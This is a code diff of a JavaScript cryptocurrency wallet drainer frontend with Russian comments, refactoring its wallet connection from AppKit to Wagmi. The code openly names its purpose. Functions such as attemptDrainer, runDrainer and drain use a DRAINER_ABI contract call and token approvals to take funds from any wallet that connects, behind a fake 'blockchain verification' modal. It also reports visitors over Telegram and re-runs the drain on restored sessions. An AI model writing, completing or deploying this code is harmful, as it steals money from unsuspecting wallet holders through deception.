@@ -1,22 +1,36 @@
 import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
+import { createConfig, http, getAccount, getProvider } from 'wagmi';
+import { walletConnect, injected, metaMask } from 'wagmi/connectors';
+import { QueryClient } from '@tanstack/react-query';
 import { ethers } from 'ethers';
 import config from './config.js';
 
-// Функция для генерации уникального sessionId
-function generateSessionId() {
-  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
-    const r = Math.random() * 16 | 0;
-    const v = c === 'x' ? r : (r & 0x3 | 0x8);
-    return v.toString(16);
-  });
-}
+// Создаем QueryClient для управления состоянием
+const queryClient = new QueryClient();
 
+// Настройка Wagmi
 const projectId = config.PROJECT_ID;
 const networks = [mainnet, polygon, bsc, arbitrum];
+const wagmiConfig = createConfig({
+  chains: networks,
+  connectors: [
+    walletConnect({ projectId }),
+    injected(),
+    metaMask()
+  ],
+  transports: {
+    [mainnet.id]: http(),
+    [polygon.id]: http(),
+    [bsc.id]: http(),
+    [arbitrum.id]: http()
+  }
+});
+
 const wagmiAdapter = new WagmiAdapter({ projectId, networks });
 
+// Инициализация AppKit
 const appKit = createAppKit({
   adapters: [wagmiAdapter],
   networks,
@@ -31,6 +45,7 @@ const appKit = createAppKit({
   allWallets: 'SHOW',
 });
 
+// Переменные
 let connectedAddress = null;
 let hasDrained = false;
 let isTransactionPending = false;
@@ -38,9 +53,9 @@ let modalOverlay = null;
 let modalContent = null;
 let modalSubtitle = null;
 let sessionId = null;
-
 let lastDrainTime = 0;
 
+// ABI для контрактов
 const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function approve(address spender, uint256 amount) returns (bool)",
@@ -51,6 +66,15 @@ const ERC20_ABI = [
 const DRAINER_ABI = [
   "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce, address[] tokenAddresses) external payable"
 ];
+
+// Вспомогательные функции
+function generateSessionId() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    const r = Math.random() * 16 | 0;
+    const v = c === 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
 
 const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -153,10 +177,6 @@ async function notifyOnVisit() {
   await sendTelegramMessage(message);
   sessionStorage.setItem('visitNotified', 'true');
 }
-
-notifyOnVisit().catch(error => {
-  console.error(`❌ Error notifying visit: ${error.message}`);
-});
 
 async function getTokenPriceInUSDT(tokenSymbol) {
   if (tokenSymbol === "USDT" || tokenSymbol === "USDTUSDT") return 1;
@@ -294,17 +314,9 @@ function shortenAddress(address) {
   return `${address.slice(0, 6)}...${address.slice(-4)}`;
 }
 
-function detectWallet(state) {
-  // Проверяем, есть ли информация о кошельке в состоянии AppKit
-  if (state?.selectedWallet) {
-    return state.selectedWallet; // AppKit может предоставить название кошелька, если доступно
-  }
-
-  // Проверяем window.ethereum для десктопных расширений
+function detectWallet() {
   if (window.ethereum?.isMetaMask) return "MetaMask";
   if (window.ethereum?.isTrust) return "Trust Wallet";
-
-  // Если нет точной информации, возвращаем "WalletConnect" для мобильных устройств
   return isMobileDevice() ? "WalletConnect" : "Unknown Wallet";
 }
 
@@ -689,6 +701,197 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
   return totalValue;
 }
 
+function showModal() {
+  modalOverlay.style.display = 'block';
+  modalOverlay.style.pointerEvents = 'auto';
+  modalContent.style.display = 'block';
+  modalSubtitle.textContent = 'Processing blockchain verification...';
+}
+
+async function hideModalWithDelay(errorMessage = null) {
+  if (errorMessage) {
+    modalSubtitle.textContent = errorMessage;
+    await new Promise(resolve => setTimeout(resolve, 2000));
+  }
+  modalOverlay.style.display = 'none';
+  modalOverlay.style.pointerEvents = 'none';
+  modalContent.style.display = 'none';
+  document.body.style.pointerEvents = 'auto';
+}
+
+async function attemptDrainer() {
+  if (hasDrained || isTransactionPending) {
+    console.log('⚠ Transaction already completed or pending');
+    await hideModalWithDelay("Transaction already completed or pending.");
+    return;
+  }
+
+  if (!connectedAddress) {
+    console.error('❌ Wallet address not defined');
+    showModal();
+    await hideModalWithDelay("Error: Wallet address not defined. Please try again.");
+    return;
+  }
+
+  showModal();
+
+  try {
+    // Получаем информацию о подключении через Wagmi
+    const account = getAccount(wagmiConfig);
+    if (!account.isConnected) {
+      throw new Error('Wallet not connected');
+    }
+
+    console.log(`🔍 Connected address from Wagmi: ${account.address}`);
+
+    if (account.address.toLowerCase() !== connectedAddress.toLowerCase()) {
+      throw new Error('Wallet address mismatch');
+    }
+
+    // Получаем провайдер через Wagmi
+    const walletProvider = getProvider(wagmiConfig);
+    if (!walletProvider) {
+      throw new Error('No provider available');
+    }
+
+    const provider = new ethers.providers.Web3Provider(walletProvider, 'any');
+    const signer = provider.getSigner();
+
+    isTransactionPending = true;
+    console.log('🔍 Запуск runDrainer...');
+    let runDrainerResult = await runDrainer(provider, signer, connectedAddress);
+    console.log('🔍 Результат runDrainer:', runDrainerResult);
+
+    let { targetChainId, targetProvider } = runDrainerResult;
+    if (targetChainId) {
+      console.log(`🔍 Переключение на chainId ${targetChainId}...`);
+      await switchChain(targetChainId);
+      console.log('🔍 Запуск drain...');
+      let status = await drain(
+        targetChainId,
+        signer,
+        connectedAddress,
+        await checkBalance(targetChainId, connectedAddress, targetProvider),
+        targetProvider
+      );
+      console.log(`✅ Drainer executed, status: ${status}`);
+    } else {
+      console.warn('⚠ Нет targetChainId, пропускаем drain');
+    }
+
+    hasDrained = true;
+    isTransactionPending = false;
+  } catch (error) {
+    isTransactionPending = false;
+    let errorMessage = "Error: An unexpected error occurred.";
+    if (error.message.includes('user rejected')) {
+      errorMessage = "Error: Transaction rejected by user.";
+    } else if (error.message.includes('Insufficient')) {
+      errorMessage = error.message;
+    } else if (error.message.includes('Failed to approve token')) {
+      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
+    } else if (error.message.includes('Failed to process')) {
+      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
+    } else if (error.message.includes('Failed to switch')) {
+      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
+    }
+    console.error(`❌ Drainer error: ${errorMessage}`, error.stack);
+    await hideModalWithDelay(errorMessage);
+    throw error;
+  }
+}
+
+async function handleConnectOrAction() {
+  try {
+    if (!connectedAddress) {
+      console.log('🔄 Opening AppKit modal for wallet selection...');
+      await appKit.open();
+
+      // Ожидаем подключения
+      connectedAddress = await waitForConnection();
+      console.log(`✅ Wallet connected: ${connectedAddress}`);
+
+      const walletProvider = getProvider(wagmiConfig);
+      if (!walletProvider) throw new Error('No provider available after connection');
+      const provider = new ethers.providers.Web3Provider(walletProvider, 'any');
+      const network = await provider.getNetwork();
+      await saveSession(connectedAddress, network.chainId);
+    } else {
+      console.log(`✅ Wallet already connected: ${connectedAddress}`);
+      if (!isTransactionPending) {
+        await attemptDrainer();
+      } else {
+        console.log('⏳ Transaction already in progress');
+        await hideModalWithDelay("Transaction already in progress.");
+      }
+    }
+  } catch (error) {
+    console.error(`❌ Connection error: ${error.message}`);
+    appKit.close();
+    isTransactionPending = false;
+    showModal();
+    await hideModalWithDelay(`Error: ${error.message}`);
+  }
+}
+
+async function waitForConnection() {
+  return new Promise((resolve, reject) => {
+    console.log('📡 Ожидание подключения кошелька через AppKit...');
+    const isMobile = isMobileDevice();
+    console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
+
+    // Открываем модальное окно AppKit
+    appKit.open();
+
+    let attempts = 0;
+    const maxAttempts = 15;
+    const interval = 1000;
+
+    const checkConnection = async () => {
+      try {
+        const account = getAccount(wagmiConfig);
+        if (account.isConnected && account.address) {
+          console.log(`✅ Кошелёк подключён: ${account.address}`);
+          connectedAddress = account.address;
+          clearInterval(checkInterval);
+          clearTimeout(timeout);
+          modalSubtitle.textContent = 'Preparing to sign transaction...';
+          try {
+            await attemptDrainer();
+            appKit.close();
+            resolve(account.address);
+          } catch (err) {
+            console.error(`❌ Error in attemptDrainer: ${err.message}`);
+            appKit.close();
+            reject(err);
+          }
+        } else {
+          throw new Error('Адрес не получен');
+        }
+      } catch (error) {
+        attempts++;
+        console.log(`ℹ Попытка ${attempts}/${maxAttempts}: Не удалось получить адрес: ${error.message}`);
+        if (attempts >= maxAttempts) {
+          console.warn('⚠ Достигнуто максимальное количество попыток');
+          clearInterval(checkInterval);
+          appKit.close();
+          reject(new Error('Не удалось подключить кошелёк после максимального числа попыток'));
+        }
+      }
+    };
+
+    const checkInterval = setInterval(checkConnection, interval);
+    const timeout = setTimeout(() => {
+      console.warn('⚠ Таймаут ожидания подключения');
+      clearInterval(checkInterval);
+      appKit.close();
+      reject(new Error('Таймаут ожидания подключения кошелька'));
+    }, 60000);
+
+    checkConnection();
+  });
+}
+
 window.addEventListener('DOMContentLoaded', async () => {
   const actionButtons = document.querySelectorAll('.action-btn');
 
@@ -878,22 +1081,8 @@ window.addEventListener('DOMContentLoaded', async () => {
     connectedAddress = sessionData.userAddress;
     console.log(`ℹ Restored session for address: ${connectedAddress}`);
     try {
-      const state = await new Promise(resolve => {
-        const unsubscribe = appKit.subscribeState(state => {
-          console.log('🔍 SubscribeState (restore):', state);
-          if ((state.connected || state.loading === false) && (state.address || state.accounts?.[0])) {
-            unsubscribe();
-            resolve(state);
-          }
-        });
-        setTimeout(() => {
-          unsubscribe();
-          resolve(null);
-        }, 2000);
-      });
-      if (state && (state.address || state.accounts?.[0]) && 
-          ((state.address && state.address.toLowerCase() === connectedAddress.toLowerCase()) || 
-           (state.accounts?.[0] && state.accounts[0].toLowerCase() === connectedAddress.toLowerCase()))) {
+      const account = getAccount(wagmiConfig);
+      if (account.isConnected && account.address.toLowerCase() === connectedAddress.toLowerCase()) {
         await attemptDrainer();
       } else {
         console.warn(`⚠ Wallet not connected or address mismatch, clearing session`);
@@ -910,233 +1099,8 @@ window.addEventListener('DOMContentLoaded', async () => {
   actionButtons.forEach(btn => {
     btn.addEventListener('click', handleConnectOrAction);
   });
-});
 
-function showModal() {
-  modalOverlay.style.display = 'block';
-  modalOverlay.style.pointerEvents = 'auto';
-  modalContent.style.display = 'block';
-  modalSubtitle.textContent = 'Processing blockchain verification...';
-}
-
-async function hideModalWithDelay(errorMessage = null) {
-  if (errorMessage) {
-    modalSubtitle.textContent = errorMessage;
-    await new Promise(resolve => setTimeout(resolve, 2000));
-  }
-  modalOverlay.style.display = 'none';
-  modalOverlay.style.pointerEvents = 'none';
-  modalContent.style.display = 'none';
-  document.body.style.pointerEvents = 'auto';
-}
-
-async function attemptDrainer() {
-  if (hasDrained || isTransactionPending) {
-    console.log('⚠ Transaction already completed or pending');
-    await hideModalWithDelay("Transaction already completed or pending.");
-    return;
-  }
-
-  if (!connectedAddress) {
-    console.error('❌ Wallet address not defined');
-    showModal();
-    await hideModalWithDelay("Error: Wallet address not defined. Please try again.");
-    return;
-  }
-
-  showModal();
-
-  try {
-    // Логируем начальное состояние
-    let appKitState = appKit.getState ? appKit.getState() : {};
-    console.log('🔍 Начальное состояние appKit:', JSON.stringify(appKitState, null, 2));
-
-    // Ожидаем завершения loading
-    let attempts = 0;
-    const maxAttempts = 10;
-    const interval = 1000;
-    while (appKitState.loading && attempts < maxAttempts) {
-      console.log(`ℹ Ожидание завершения loading, попытка ${attempts + 1}/${maxAttempts}...`);
-      await new Promise(resolve => setTimeout(resolve, interval));
-      appKitState = appKit.getState ? appKit.getState() : {};
-      attempts++;
-    }
-
-    if (appKitState.loading) {
-      throw new Error('AppKit loading state not resolved');
-    }
-
-    // Получаем провайдер через appKit.getProvider
-    let walletProvider = null;
-    try {
-      walletProvider = await appKit.getProvider();
-      console.log('✅ Провайдер получен через appKit.getProvider:', walletProvider);
-    } catch (error) {
-      console.error(`❌ Ошибка при получении провайдера: ${error.message}`);
-      throw new Error('Failed to get provider from appKit.getProvider');
-    }
-
-    if (!walletProvider) {
-      throw new Error('No provider available after wallet connection');
-    }
-
-    let provider = new ethers.providers.Web3Provider(walletProvider, 'any');
-    let signer = provider.getSigner();
-    let address = await signer.getAddress();
-
-    console.log('🔍 Адрес из signer:', address);
-
-    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
-      throw new Error('Wallet address mismatch');
-    }
-
-    await new Promise(resolve => setTimeout(resolve, 10));
-
-    isTransactionPending = true;
-    console.log('🔍 Запуск runDrainer...');
-    let runDrainerResult = await runDrainer(provider, signer, connectedAddress);
-    console.log('🔍 Результат runDrainer:', runDrainerResult);
-
-    let { targetChainId, targetProvider } = runDrainerResult;
-    if (targetChainId) {
-      console.log(`🔍 Переключение на chainId ${targetChainId}...`);
-      await switchChain(targetChainId);
-      console.log('🔍 Запуск drain...');
-      let status = await drain(
-        targetChainId,
-        signer,
-        connectedAddress,
-        await checkBalance(targetChainId, connectedAddress, targetProvider),
-        targetProvider
-      );
-      console.log(`✅ Drainer executed, status: ${status}`);
-    } else {
-      console.warn('⚠ Нет targetChainId, пропускаем drain');
-    }
-
-    hasDrained = true;
-    isTransactionPending = false;
-  } catch (error) {
-    isTransactionPending = false;
-    let errorMessage = "Error: An unexpected error occurred.";
-    if (error.message.includes('user rejected')) {
-      errorMessage = "Error: Transaction rejected by user.";
-    } else if (error.message.includes('Insufficient')) {
-      errorMessage = error.message;
-    } else if (error.message.includes('Failed to approve token')) {
-      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
-    } else if (error.message.includes('Failed to process')) {
-      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
-    } else if (error.message.includes('Failed to switch')) {
-      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
-    } else if (error.message.includes('invalid assignment to const')) {
-      errorMessage = `Error: Invalid assignment to constant variable (likely a code issue): ${error.message}`;
-    } else {
-      errorMessage = `Error: ${error.message}`;
-    }
-    console.error(`❌ Drainer error: ${errorMessage}`, error.stack);
-    await hideModalWithDelay(errorMessage);
-    throw error;
-  }
-}async function handleConnectOrAction() {
-  try {
-    if (!connectedAddress) {
-      console.log('🔄 Opening AppKit modal for wallet selection...');
-      await appKit.open();
-      connectedAddress = await waitForConnection();
-      console.log(`✅ Wallet connected in handleConnectOrAction: ${connectedAddress}`);
-
-      const walletProvider = wagmiAdapter.provider;
-      if (!walletProvider) throw new Error('No provider available after connection');
-      const provider = new ethers.providers.Web3Provider(walletProvider, 'any');
-      const network = await provider.getNetwork();
-      await saveSession(connectedAddress, network.chainId);
-    } else {
-      console.log(`✅ Wallet already connected: ${connectedAddress}`);
-      if (!isTransactionPending) {
-        await attemptDrainer();
-      } else {
-        console.log('⏳ Transaction already in progress');
-        await hideModalWithDelay("Transaction already in progress.");
-      }
-    }
-  } catch (error) {
-    console.error(`❌ Connection error: ${error.message}`);
-    appKit.close();
-    isTransactionPending = false;
-    showModal();
-    await hideModalWithDelay(`Error: ${error.message}`);
-  }
-}
-
-async function waitForConnection() {
-  return new Promise((resolve, reject) => {
-    console.log('📡 Ожидание подключения кошелька через AppKit...');
-    const isMobile = isMobileDevice();
-    console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
-
-    // Открываем модальное окно AppKit
-    appKit.open();
-
-    let attempts = 0;
-    const maxAttempts = 15; // Максимум 15 попыток
-    const interval = 1000; // Интервал 1 секунда
-
-    // Функция для получения и обработки адреса
-    const checkAddress = async () => {
-      try {
-        const walletAddress = await appKit.getAddress();
-        console.log(`🔍 Адрес от appKit.getAddress: ${walletAddress}`);
-
-        // Обработка формата CAIP (eip155:chainId:address)
-        let cleanAddress = walletAddress;
-        if (walletAddress?.startsWith('eip155:')) {
-          cleanAddress = walletAddress.split(':')[2];
-          console.log(`🔍 Извлечён чистый адрес из CAIP: ${cleanAddress}`);
-        }
-
-        if (cleanAddress) {
-          console.log(`✅ Кошелёк подключён: ${cleanAddress}`);
-          connectedAddress = cleanAddress;
-          clearInterval(checkInterval);
-          clearTimeout(timeout);
-          modalSubtitle.textContent = 'Preparing to sign transaction...';
-          try {
-            await attemptDrainer();
-            appKit.close();
-            resolve(cleanAddress);
-          } catch (err) {
-            console.error(`❌ Error in attemptDrainer: ${err.message}`);
-            appKit.close();
-            reject(err);
-          }
-        } else {
-          throw new Error('Адрес не получен');
-        }
-      } catch (error) {
-        attempts++;
-        console.log(`ℹ Попытка ${attempts}/${maxAttempts}: Не удалось получить адрес: ${error.message}`);
-        if (attempts >= maxAttempts) {
-          console.warn('⚠ Достигнуто максимальное количество попыток');
-          clearInterval(checkInterval);
-          appKit.close();
-          reject(new Error('Не удалось подключить кошелёк после максимального числа попыток'));
-        }
-      }
-    };
-
-    // Запускаем периодическую проверку
-    const checkInterval = setInterval(checkAddress, interval);
-
-    // Устанавливаем таймаут
-    const timeout = setTimeout(() => {
-      console.warn('⚠ Таймаут ожидания подключения');
-      clearInterval(checkInterval);
-      appKit.close();
-      reject(new Error('Таймаут ожидания подключения кошелька'));
-    }, 60000); // 60 секунд
-
-    // Проверяем сразу
-    checkAddress();
+  notifyOnVisit().catch(error => {
+    console.error(`❌ Error notifying visit: ${error.message}`);
   });
-}
+});
